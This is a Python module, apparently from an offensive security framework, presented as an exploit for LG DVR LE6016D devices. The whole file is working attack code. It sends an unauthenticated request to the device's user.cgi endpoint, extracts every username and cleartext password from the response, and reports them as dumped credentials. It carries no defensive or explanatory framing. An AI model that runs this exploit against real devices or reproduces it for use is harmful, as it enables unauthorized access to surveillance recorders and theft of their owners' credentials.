import httpx
import re
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "lg_dvr_credentials_disclosure/device_rsp_attack"
        self.description = "LG DVR LE6016D Cleartext Credentials Extractor (Exploit)."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        print("\033[1;31m[!] Launching attack payload loop: lg_dvr_credentials_disclosure/device_rsp_attack...\033[0m")
        
        url = f"http://{target}:{port}/dvr/wwwroot/user.cgi" if not target.startswith(("http://", "https://")) else f"{target.rstrip('/')}/dvr/wwwroot/user.cgi"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) dvr-framework/1.0"
        }
        
        try:
            async with httpx.AsyncClient(timeout=8.0, verify=False) as client:
                print("\033[1;33m[*] Interrogating unauthenticated users configuration node...\033[0m")
                response = await client.get(url, headers=headers)
                
                if response.status_code == 200 and "<name>" in response.text:
                    # Extraction en bloc de toutes les occurrences de balises de noms et mots de passe
                    names = re.findall(r'<name>(.*?)</name>', response.text)
                    passwords = re.findall(r'<pw>(.*?)</pw>', response.text)
                    
                    extracted_credentials = []
                    # Association indexée des listes extraites (comme la boucle itérative d'origine)
                    for user, password in zip(names, passwords):
                        if user.strip():
                            extracted_credentials.append(f"User: {user.strip()} | Pass: {password.strip()}")
                    
                    if extracted_credentials:
                        credentials_output = "\n".join(f"  -> {cred}" for cred in extracted_credentials)
                        return {
                            "success": True,
                            "details": f"Database Credentials Dumped Successfully!\n{credentials_output}"
                        }
        except Exception as e:
            return {"success": False, "error": str(e)}
        return {"success": False, "details": "Exploit triggered but server returned an unhandled signature layout."}
